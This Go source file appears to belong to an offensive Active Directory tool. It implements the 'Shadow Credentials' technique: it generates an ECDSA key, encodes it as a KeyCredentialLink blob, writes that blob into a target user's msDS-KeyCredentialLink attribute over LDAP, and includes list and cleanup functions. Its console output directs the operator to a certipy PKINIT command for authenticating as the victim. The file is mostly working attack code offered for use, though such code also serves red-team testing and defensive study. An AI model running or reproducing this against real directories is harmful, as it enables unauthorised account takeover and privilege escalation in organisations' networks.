package pki

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
)

// KeyCredentialLink TLV entry types (MS-ADTS 2.2.14)
const (
	kcVersion             uint16 = 0x0200
	kceKeyID              byte   = 0x01
	kceKeyHash            byte   = 0x02
	kceKeyMaterial        byte   = 0x03
	kceKeyUsage           byte   = 0x04
	kceKeySource          byte   = 0x05
	kceDeviceId           byte   = 0x06
	kceCustomKeyInfo      byte   = 0x07
	kceKeyApproxLastLogon byte   = 0x08
	kceKeyCreationTime    byte   = 0x09
	keyUsageNGC           byte   = 0x01
	keySourceAD           byte   = 0x00
)

// KeyCredentialEntry holds generated key credential material.
type KeyCredentialEntry struct {
	KeyID      string
	DeviceID   string
	RawValue   []byte
	PrivateKey *ecdsa.PrivateKey
	CreatedAt  time.Time
}

// GenerateKeyCredential creates a new KeyCredentialLink entry with a fresh ECDSA P256 keypair.
func GenerateKeyCredential() (*KeyCredentialEntry, error) {
	privKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("generate key: %w", err)
	}

	pubDER, err := x509.MarshalPKIXPublicKey(&privKey.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("marshal public key: %w", err)
	}

	keyHash := sha256.Sum256(pubDER)
	keyID := hex.EncodeToString(keyHash[:16])

	deviceIDBytes := make([]byte, 16)
	rand.Read(deviceIDBytes)
	deviceID := formatGUID(deviceIDBytes)

	now := time.Now().UTC()
	filetime := timeToFiletime(now)

	var blob []byte
	ver := make([]byte, 4)
	binary.LittleEndian.PutUint32(ver, uint32(kcVersion))
	blob = append(blob, ver...)
	blob = append(blob, buildKCETLV(kceKeyID, keyHash[:])...)
	blob = append(blob, buildKCETLV(kceKeyHash, keyHash[:])...)
	blob = append(blob, buildKCETLV(kceKeyMaterial, pubDER)...)
	blob = append(blob, buildKCETLV(kceKeyUsage, []byte{keyUsageNGC})...)
	blob = append(blob, buildKCETLV(kceKeySource, []byte{keySourceAD})...)
	blob = append(blob, buildKCETLV(kceDeviceId, deviceIDBytes)...)
	blob = append(blob, buildKCETLV(kceCustomKeyInfo, []byte{0x00})...)
	blob = append(blob, buildKCETLV(kceKeyApproxLastLogon, filetime)...)
	blob = append(blob, buildKCETLV(kceKeyCreationTime, filetime)...)

	return &KeyCredentialEntry{
		KeyID:      keyID,
		DeviceID:   deviceID,
		RawValue:   blob,
		PrivateKey: privKey,
		CreatedAt:  now,
	}, nil
}

func buildKCETLV(entryType byte, data []byte) []byte {
	entry := make([]byte, 3+len(data))
	entry[0] = entryType
	binary.LittleEndian.PutUint16(entry[1:3], uint16(len(data)))
	copy(entry[3:], data)
	return entry
}

func timeToFiletime(t time.Time) []byte {
	windowsEpoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	intervals := uint64(t.Sub(windowsEpoch).Nanoseconds() / 100)
	ft := make([]byte, 8)
	binary.LittleEndian.PutUint64(ft, intervals)
	return ft
}

func formatGUID(b []byte) string {
	if len(b) < 16 {
		return hex.EncodeToString(b)
	}
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		binary.LittleEndian.Uint32(b[0:4]),
		binary.LittleEndian.Uint16(b[4:6]),
		binary.LittleEndian.Uint16(b[6:8]),
		binary.BigEndian.Uint16(b[8:10]),
		b[10:16])
}

// AddShadowCredential writes a new KeyCredentialLink entry to the target user object.
func AddShadowCredential(cfg *ADCSConfig, targetDN string) (*KeyCredentialEntry, error) {
	fmt.Printf("[+] Shadow Credentials: Adding key to %s\n", targetDN)

	entry, err := GenerateKeyCredential()
	if err != nil {
		return nil, fmt.Errorf("generate credential: %w", err)
	}

	conn, err := connectLDAP(cfg)
	if err != nil {
		return nil, fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	hexValue := hex.EncodeToString(entry.RawValue)
	dnWithBinary := fmt.Sprintf("B:%d:%s:%s", len(hexValue), hexValue, targetDN)

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Add("msDS-KeyCredentialLink", []string{dnWithBinary})

	if err := conn.Modify(modReq); err != nil {
		return nil, fmt.Errorf("LDAP modify (add KeyCredentialLink): %w", err)
	}

	fmt.Printf("[+] Shadow credential added\n")
	fmt.Printf("    Target:    %s\n", targetDN)
	fmt.Printf("    DeviceID:  %s\n", entry.DeviceID)
	fmt.Printf("    KeyID:     %s\n", entry.KeyID)
	fmt.Printf("    Created:   %s\n", entry.CreatedAt.Format(time.RFC3339))
	fmt.Println("[*] Next: use the private key for PKINIT authentication")
	fmt.Printf("    certipy auth -pfx shadow.pfx -dc-ip %s\n", cfg.TargetDC)

	return entry, nil
}

// RemoveShadowCredential removes a KeyCredentialLink entry by DeviceID.
func RemoveShadowCredential(cfg *ADCSConfig, targetDN, deviceID string) error {
	fmt.Printf("[*] Removing shadow credential DeviceID=%s from %s\n", deviceID, targetDN)

	conn, err := connectLDAP(cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	searchReq := ldap.NewSearchRequest(
		targetDN, ldap.ScopeBaseObject, ldap.NeverDerefAliases,
		0, 0, false, "(objectClass=*)",
		[]string{"msDS-KeyCredentialLink"}, nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return fmt.Errorf("read KeyCredentialLink: %w", err)
	}
	if len(result.Entries) == 0 {
		return fmt.Errorf("target DN not found: %s", targetDN)
	}

	currentValues := result.Entries[0].GetAttributeValues("msDS-KeyCredentialLink")
	if len(currentValues) == 0 {
		return fmt.Errorf("no KeyCredentialLink values on %s", targetDN)
	}

	var keepValues []string
	removed := false
	cleanID := strings.ReplaceAll(deviceID, "-", "")
	for _, v := range currentValues {
		if strings.Contains(strings.ToLower(v), strings.ToLower(cleanID)) {
			removed = true
			continue
		}
		keepValues = append(keepValues, v)
	}

	if !removed {
		return fmt.Errorf("no entry found with DeviceID=%s", deviceID)
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	if len(keepValues) == 0 {
		modReq.Delete("msDS-KeyCredentialLink", currentValues)
	} else {
		modReq.Replace("msDS-KeyCredentialLink", keepValues)
	}

	if err := conn.Modify(modReq); err != nil {
		return fmt.Errorf("LDAP modify (remove KeyCredentialLink): %w", err)
	}

	fmt.Println("[+] Shadow credential removed")
	return nil
}

// ListShadowCredentials reads and displays all KeyCredentialLink entries on a target.
func ListShadowCredentials(cfg *ADCSConfig, targetDN string) error {
	fmt.Printf("[*] Listing shadow credentials on %s\n", targetDN)

	conn, err := connectLDAP(cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	searchReq := ldap.NewSearchRequest(
		targetDN, ldap.ScopeBaseObject, ldap.NeverDerefAliases,
		0, 0, false, "(objectClass=*)",
		[]string{"msDS-KeyCredentialLink"}, nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return fmt.Errorf("read KeyCredentialLink: %w", err)
	}
	if len(result.Entries) == 0 {
		return fmt.Errorf("target DN not found: %s", targetDN)
	}

	values := result.Entries[0].GetAttributeValues("msDS-KeyCredentialLink")
	if len(values) == 0 {
		fmt.Println("[*] No KeyCredentialLink values found")
		return nil
	}

	fmt.Printf("[+] Found %d KeyCredentialLink entries:\n\n", len(values))
	for i, v := range values {
		fmt.Printf("  Entry %d:\n", i+1)
		parts := strings.SplitN(v, ":", 4)
		if len(parts) >= 4 {
			fmt.Printf("    DN:   %s\n", parts[3])
			hexData := parts[2]
			if len(hexData) > 32 {
				fmt.Printf("    Blob: %s... (%d bytes)\n", hexData[:32], len(hexData)/2)
			}
		} else {
			fmt.Printf("    Raw: %s\n", v)
		}
		fmt.Println()
	}

	return nil
}
